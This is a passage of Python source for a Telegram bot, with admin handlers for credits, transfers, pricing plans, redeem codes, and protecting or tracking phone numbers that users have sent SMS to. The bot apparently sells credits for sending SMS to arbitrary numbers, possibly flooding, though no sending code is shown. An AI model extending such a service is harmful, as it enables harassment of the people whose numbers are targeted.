        f"{em(EMOJI_BELL, '💬')} Support: Contact owner ({SUPER_ADMIN_NAME}) for any issues.\n\n"
        f"<i>Bot use karne ke liye credits chahiye. Referral se free credits paayein!</i>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML",
        disable_web_page_preview=True
    )

@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await cq.answer()

# Protect / track / credits all / transfer — keep working stubs that match original behaviour

@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.protect_number)
    await safe_edit(cq.message,
        f"{em(EMOJI_LOCK, '🔒')} <b>Protect Number</b>\n\nNumber bhejo jo protect karna hai:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.protect_number)
async def owner_protect_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    number = msg.text.strip()
    PROTECTED_NUMBERS[number] = msg.from_user.id
    d["protected_numbers"] = PROTECTED_NUMBERS
    save(d)
    await state.clear()
    await msg.answer(
        q(f"{em(EMOJI_LOCK, '🔒')} <b>Protected!</b>\n<code>{number}</code>"),
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if not PROTECTED_NUMBERS:
        text = f"{em(EMOJI_LOCK, '🔒')} <b>Protected Numbers</b>\n\n<i>Empty</i>"
    else:
        lines = [f"{em(EMOJI_LOCK, '🔒')} <b>Protected Numbers</b>\n"]
        for num, by in list(PROTECTED_NUMBERS.items())[:30]:
            lines.append(f"• <code>{num}</code> by <code>{by}</code>")
        text = "\n".join(lines)
    await safe_edit(
        cq.message,
        text,
        reply_markup=kb(
            [(f"{sc('remove')}", "owner:protected_remove")],
            [(f"{sc('back')}", "owner:home")]
        ),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.track_number)
    await safe_edit(cq.message,
        f"{em(EMOJI_STAR, '📊')} <b>Track Number</b>\n\nNumber bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.track_number)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    number = msg.text.strip()
    await state.clear()
    users_who_sent = []
    for uid_str, entries in d.get("sms_history", {}).items():
        for entry in entries:
            if entry.get("number") == number:
                user_data = d.get("users", {}).get(uid_str, {})
                users_who_sent.append({
                    "uid": int(uid_str),
                    "name": user_data.get("name", "Unknown"),
                    "timestamp": entry.get("timestamp", 0)
                })
                break
    if not users_who_sent:
        await msg.answer(
            q(
                f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n"
                f"{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n\n"
                f"{em(EMOJI_CROSS, '❌')} <i>Is number pe kisi ne SMS nahi bheja abhi tak.</i>"
            ),
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
        return
    lines = [f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n"]
    lines.append(f"{em(EMOJI_STAR, '👥')} <b>Users who sent to this number:</b>\n")
    for entry in users_who_sent:
        ts = fmt_time(entry["timestamp"])
        lines.append(f"• <code>{entry['uid']}</code> — {entry['name'][:20]} — {ts}")
    await msg.answer(q("\n".join(lines)), reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

# Credits add/deduct/all — keep functional

@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_credits_uid)
    await safe_edit(cq.message,
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits</b>\n\n{sc('step 1/2')}: User ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_credits_uid)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
        await state.update_data(credit_uid=uid)
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo."), parse_mode="HTML")
        return
    await state.set_state(S.add_credits_amount)
    await msg.answer(
        q(f"{em(EMOJI_MONEY, '💰')} <b>{sc('step 2/2')}</b>\n\nKitne credits add karne hain?"),
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_credits_amount)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo."), parse_mode="HTML")
        return
    fsmd = await state.get_data()
    uid = fsmd.get("credit_uid")
    def _add(d):
        add_credits(uid, amount, d, is_manual=True)
        return get_user_credits(uid, d)
    new_balance = atomic_update(_add)
    await state.clear()
    try:
        await msg.bot.send_message(
            uid,
            q(f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n+{amount} credits mile hain!\n{em(EMOJI_MONEY, '💳')} Balance: <b>{new_balance}</b>"),
            parse_mode="HTML"
        )
    except Exception:
        pass
    await msg.answer(
        q(f"{em(EMOJI_CHECK, '✅')} <b>{amount} credits</b> added to <code>{uid}</code>!\n{em(EMOJI_MONEY, '💳')} New Balance: <b>{new_balance}</b>"),
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.deduct_credits_uid)
    await safe_edit(cq.message,
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits</b>\n\n{sc('step 1/2')}: User ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_credits_uid)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
        await state.update_data(deduct_uid=uid)
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo."), parse_mode="HTML")
        return
    await state.set_state(S.deduct_credits_amount)
    await msg.answer(
        q(f"{em(EMOJI_MONEY, '💰')} <b>{sc('step 2/2')}</b>\n\nKitne credits deduct karne hain?"),
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_credits_amount)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo."), parse_mode="HTML")
        return
    fsmd = await state.get_data()
    uid = fsmd.get("deduct_uid")
    success = deduct_credits(uid, amount, d)
    save(d)
    await state.clear()
    if success:
        try:
            await msg.bot.send_message(
                uid,
                q(f"{em(EMOJI_WARNING, '⚠️')} <b>Credits Deducted!</b>\n\n-{amount} credits kat gaye.\n{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(uid, d)}</b>"),
                parse_mode="HTML"
            )
        except Exception:
            pass
        await msg.answer(
            q(f"{em(EMOJI_CHECK, '✅')} <b>{amount} credits</b> deducted from <code>{uid}</code>!\n{em(EMOJI_MONEY, '💳')} New Balance: <b>{get_user_credits(uid, d)}</b>"),
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
    else:
        await msg.answer(
            q(f"{em(EMOJI_CROSS, '❌')} Insufficient credits! User ke paas sirf <b>{get_user_credits(uid, d)}</b> credits hain."),
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )

@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        await cq.answer("🚫 You are banned!", show_alert=True)
        return
    if not can_use(uid, d):
        await cq.answer("⛔ Access nahi hai!", show_alert=True)
        return
    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await cq.answer("❌ Minimum 2 credits chahiye transfer ke liye!", show_alert=True)
        return
    await state.set_state(S.transfer_credits_uid)
    await safe_edit(cq.message,
        f"{em(EMOJI_MONEY, '💸')} <b>Transfer Credits</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Your Credits: <b>{current_credits}</b>\n"
        f"{em(EMOJI_WARNING, '⚠️')} Aap apne <b>half credits</b> hi transfer kar sakte hain!\n\n"
        f"{sc('step 1/2')}: Jis user ko credits dena hai uska <b>User ID</b> bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.transfer_credits_uid)
async def user_transfer_uid(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        target_uid = int(msg.text.strip())
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid User ID bhejo (numbers only):"), parse_mode="HTML")
        return
    if target_uid == uid:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Apne aap ko transfer nahi kar sakte!"), parse_mode="HTML")
        return
    if str(target_uid) not in d.get("users", {}):
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} User ID exist nahi karta!"), parse_mode="HTML")
        return
    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Minimum 2 credits chahiye!"), parse_mode="HTML")
        return
    await state.update_data(transfer_target=target_uid)
    await state.set_state(S.transfer_credits_amount)
    half = current_credits // 2
    await msg.answer(
        q(
            f"{em(EMOJI_MONEY, '💸')} <b>{sc('step 2/2')} — {sc('amount')}</b>\n\n"
            f"{em(EMOJI_STAR, '👤')} Target User: <code>{target_uid}</code>\n"
            f"{em(EMOJI_MONEY, '💰')} Your Credits: <b>{current_credits}</b>\n"
            f"{em(EMOJI_ROCKET, '📤')} Max Transfer (Half): <b>{half}</b>\n\n"
            f"Kitne credits transfer karne hain? (Max {half})"
        ),
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.transfer_credits_amount)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        amount = int(msg.text.strip())
        if amount <= 0:
            raise ValueError
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo:"), parse_mode="HTML")
        return
    fsmd = await state.get_data()
    target_uid = fsmd.get("transfer_target")
    current_credits = get_user_credits(uid, d)
    max_transfer = current_credits // 2
    if amount > max_transfer:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Aap sirf {max_transfer} credits transfer kar sakte hain! (Half of {current_credits})"), parse_mode="HTML")
        return
    if not deduct_credits(uid, amount, d):
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Insufficient credits!"), parse_mode="HTML")
        return
    add_credits(target_uid, amount, d, is_manual=False)
    save(d)
    await state.clear()
    try:
        await msg.bot.send_message(
            target_uid,
            q(
                f"{em(EMOJI_MONEY, '💸')} <b>Credits Received!</b>\n\n"
                f"{em(EMOJI_STAR, '👤')} Received from: <code>{uid}</code>\n"
                f"{em(EMOJI_MONEY, '💰')} Amount: <b>{amount}</b> credits\n"
                f"{em(EMOJI_MONEY, '💳')} New Balance: <b>{get_user_credits(target_uid, d)}</b>"
            ),
            parse_mode="HTML"
        )
    except Exception:
        pass
    await msg.answer(
        q(
            f"{em(EMOJI_CHECK, '✅')} <b>Transfer Successful!</b>\n\n"
            f"{em(EMOJI_STAR, '👤')} To: <code>{target_uid}</code>\n"
            f"{em(EMOJI_MONEY, '💰')} Amount: <b>{amount}</b> credits\n"
            f"{em(EMOJI_MONEY, '💳')} Your Balance: <b>{get_user_credits(uid, d)}</b>"
        ),
        reply_markup=kb([(f"{sc('home')}", "user:home")]),
        parse_mode="HTML"
    )
    log_activity(d, "credit_transfer", uid, f"Transferred {amount} credits to {target_uid}")

@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    settings = d.get("settings", {})
    text = (
        f"{em(EMOJI_GEAR, '⚙️')} <b>Bot Settings</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Referral Credits: <b>{settings.get('ref_credits', 3)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} Max Owners: <b>{settings.get('max_owners', 6)}</b>\n\n"
        f"<i>Settings change karne ke liye niche se select karein.</i>"
    )
    rows = [
        [btn("sᴇᴛ ʀᴇғᴇʀʀᴀʟ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await safe_edit(cq.message, text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:settings:ref")
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.set_ref_credits)
    await safe_edit(cq.message,
        f"{em(EMOJI_GIFT, '🎁')} <b>Set Referral Credits</b>\n\nReferral pe kitne credits dena hai?\n<i>Example: 5</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:settings")]),
        parse_mode="HTML"
    )

@R.message(S.set_ref_credits)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        if credits < 0:
            raise ValueError
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo."), parse_mode="HTML")
        return
    d.setdefault("settings", {})["ref_credits"] = credits
    d["premium"]["ref_credits"] = credits
    save(d)
    await state.clear()
    await msg.answer(
        q(f"{em(EMOJI_CHECK, '✅')} <b>Referral Credits Updated!</b>\n\nAb har referral pe <b>{credits}</b> credits milenge."),
        reply_markup=kb([(f"{sc('back')}", "owner:settings")]),
        parse_mode="HTML"
    )

# Pricing / redeem menus (minimal but working)

@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])
    text = f"{em(EMOJI_MONEY, '💳')} <b>Pricing Plans</b>\n\nTotal Plans: <b>{len(plans)}</b>\n\n"
    for i, plan in enumerate(plans, 1):
        text += f"{i}. <b>{plan['name']}</b>\n   {em(EMOJI_MONEY, '💰')} {plan['price']} {plan.get('currency', 'INR')} = {plan['credits']} credits\n   {em(EMOJI_GEAR, '🔗')} {plan['payment_link']}\n\n"
    rows = [
        [btn("ᴀᴅᴅ ᴘʟᴀɴ", "owner:pricing:add", EMOJI_CHECK, "➕")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴘʟᴀɴ", "owner:pricing:remove", EMOJI_CROSS, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await safe_edit(cq.message, text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_plan_name)
    await safe_edit(cq.message,
        f"{em(EMOJI_MONEY, '💳')} <b>Add Pricing Plan</b>\n\n{sc('step 1/4')}: Plan ka naam bhejo:\n<i>Example: Basic Plan</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_name)
async def owner_pricing_name(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    await state.update_data(plan_name=msg.text.strip())
    await state.set_state(S.add_plan_price)
    await msg.answer(
        q(f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 2/4')}</b>\n\nPrice bhejo:\n<i>Example: 50</i>"),
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_price)
async def owner_pricing_price(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        price = float(msg.text.strip())
        await state.update_data(plan_price=price)
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid price bhejo (numbers only)."), parse_mode="HTML")
        return
    await state.set_state(S.add_plan_credits)
    await msg.answer(
        q(f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 3/4')}</b>\n\nKitne credits dena hai?\n<i>Example: 100</i>"),
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_credits)
async def owner_pricing_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        await state.update_data(plan_credits=credits)
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo."), parse_mode="HTML")
        return
    await state.set_state(S.add_plan_link)
    await msg.answer(
        q(
            f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 4/4')}</b>\n\nPayment redirect link bhejo:\n"
            f"<i>Example: {SUPER_ADMIN_LINK} ya koi payment URL</i>"
        ),
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_link)
async def owner_pricing_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid URL bhejo (https:// se start hona chahiye)."), parse_mode="HTML")
        return
    fsmd = await state.get_data()
    plan = {
        "id": str(int(time.time())),
        "name": fsmd.get("plan_name", "Plan"),
        "price": fsmd.get("plan_price", 0),
        "credits": fsmd.get("plan_credits", 0),
        "currency": "INR",
        "payment_link": link
    }
    d.setdefault("pricing", {}).setdefault("plans", []).append(plan)
    save(d)
    await state.clear()
    await msg.answer(
        q(f"{em(EMOJI_CHECK, '✅')} <b>Plan Added!</b>\n\n{em(EMOJI_STAR, '📋')} {plan['name']}\n{em(EMOJI_MONEY, '💰')} {plan['price']} INR = {plan['credits']} credits\n{em(EMOJI_GEAR, '🔗')} {plan['payment_link']}"),
        reply_markup=kb([(f"{sc('back')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:pricing:remove")
async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ Koi plan nahi hai!", show_alert=True)
        return
    rows = []
    for plan in plans:
        rows.append([btn(f"{plan['name'][:25]}", f"owner:pricing:del:{plan['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:pricing:menu", EMOJI_GEAR, "🔙")])
    await safe_edit(cq.message,
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Plan</b>\n\nKaunsa plan hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def owner_pricing_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plan_id = cq.data.split("owner:pricing:del:", 1)[1]
    plans = d.get("pricing", {}).get("plans", [])
    d["pricing"]["plans"] = [p for p in plans if p["id"] != plan_id]
    save(d)
    await cq.answer("🗑 Plan removed!")
    await owner_pricing_menu(cq, state)

@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})
    text = f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Codes</b>\n\nTotal: <b>{len(codes)}</b>\n\n"
    for code, data in list(codes.items())[:10]:
        status = f"{em(EMOJI_CHECK, '✅')} Active" if data.get("uses_left", 0) > 0 else f"{em(EMOJI_CROSS, '❌')} Expired"
        text += f"<code>{code}</code> — {em(EMOJI_MONEY, '💰')}{data['credits']} — {status} ({data.get('uses_left', 0)} left)\n"
    rows = [
        [btn("ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:gen", EMOJI_CHECK, "➕")],
        [btn("ᴅᴇʟᴇᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:del", EMOJI_CROSS, "🗑")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴄʀᴇᴅɪᴛs (ʀᴇᴅᴇᴇᴍ)", "owner:redeem:remove_credits:menu", EMOJI_MONEY, "💸", style="danger")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await safe_edit(cq.message, text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.gen_redeem_credits)
    await safe_edit(cq.message,
        f"{em(EMOJI_GIFT, '🎁')} <b>Generate Redeem Code</b>\n\n{sc('step 1/2')}: Kitne credits dena hai?\n<i>Example: 50</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.message(S.gen_redeem_credits)
async def owner_redeem_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        await state.update_data(gen_credits=credits)
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo."), parse_mode="HTML")
        return
    await state.set_state(S.gen_redeem_uses)
    await msg.answer(
        q(f"{em(EMOJI_GIFT, '🎁')} <b>{sc('step 2/2')}</b>\n\nKitni baar use ho sakta hai?\n<i>Example: 10</i>"),
        reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.message(S.gen_redeem_uses)
async def owner_redeem_uses(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        uses = int(msg.text.strip())
        if uses < 1:
            raise ValueError
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo (1 ya zyada)."), parse_mode="HTML")
        return
    fsmd = await state.get_data()
    credits = fsmd.get("gen_credits", 10)
    def _gen(d):
        while True:
            code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
            if code not in d.get("redeem_codes", {}):
                break
        d.setdefault("redeem_codes", {})[code] = {
            "credits": credits,
            "uses_left": uses,
            "created_by": msg.from_user.id,
            "created_at": int(time.time()),
            "used_by": []
        }
        return code
    code = atomic_update(_gen)
    await state.clear()
    me = await msg.bot.get_me()
    redeem_link = f"https://t.me/{me.username}?start=RDM{code}"
    await msg.answer(
        q(
            f"{em(EMOJI_GIFT, '🎉')} <b>Redeem Code Generated!</b>\n\n"
            f"{em(EMOJI_GIFT, '🎁')} Code: <code>{code}</code>\n"
            f"{em(EMOJI_MONEY, '💰')} Credits: <b>{credits}</b>\n"
            f"{em(EMOJI_STAR, '🔢')} Max Uses: <b>{uses}</b>\n\n"
            f"{em(EMOJI_GEAR, '🔗')} <b>Auto-Redeem Link:</b>\n<code>{redeem_link}</code>"
        ),
        reply_markup=kb([(f"{sc('back')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:redeem:del")
async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})
    if not codes:
        await cq.answer("❌ Koi code nahi hai!", show_alert=True)
        return
    rows = []
    for code in list(codes.keys())[:20]:
        rows.append([btn(code, f"owner:redeem:deldo:{code}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙")])
    await safe_edit(cq.message,
        f"{em(EMOJI_CROSS, '🗑')} <b>Delete Redeem Code</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def owner_redeem_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    code = cq.data.split("owner:redeem:deldo:", 1)[1]
    if code in d.get("redeem_codes", {}):
        del d["redeem_codes"][code]
        save(d)
    await cq.answer("🗑 Code deleted!")
    await owner_redeem_menu(cq, state)

@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.add_all_credits_amount)
    await safe_edit(cq.message,
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits to ALL Users</b>\n\n"
        f"Kitne credits sabhi users ko dena hai?\n"
        f"<i>Example: 10</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_all_credits_amount)
async def owner_add_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
        if amount <= 0:
            raise ValueError
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo."), parse_mode="HTML")
        return
    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Koi user nahi hai!"), reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        return
    count = 0
    for uid_str in users:
        add_credits(int(uid_str), amount, d, is_manual=True)
        count += 1
    save(d)
    success = 0
    notification = q(
        f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n"
        f"{em(EMOJI_GIFT, '🎉')} Aapko <b>{amount}</b> credits mile hain!"
    )
    for uid_str in users:
        try:
            await msg.bot.send_message(int(uid_str), notification, parse_mode="HTML")
            success += 1
            await asyncio.sleep(0.05)
        except Exception:
            pass
    await msg.answer(
        q(
            f"{em(EMOJI_CHECK, '✅')} <b>Credits Added to All Users!</b>\n\n"
            f"{em(EMOJI_MONEY, '💰')} {amount} credits each\n"
            f"{em(EMOJI_STAR, '👥')} Total users: <b>{count}</b>\n"
            f"{em(EMOJI_BELL, '📨')} Notified: <b>{success}</b> users"
        ),
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.deduct_all_credits_amount)
    await safe_edit(cq.message,
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits from ALL Users</b>\n\n"
        f"Kitne credits sabhi users se katne hain?\n"
        f"<i>Manual-added credits stay protected. Owners/Admins skipped.</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_all_credits_amount)
async def owner_deduct_all_credits_confirm(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
        if amount < 0:
            raise ValueError
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo."), parse_mode="HTML")
        return
    await state.update_data(deduct_all_amount=amount)
    confirm_kb = InlineKeyboardMarkup(inline_keyboard=[
        [
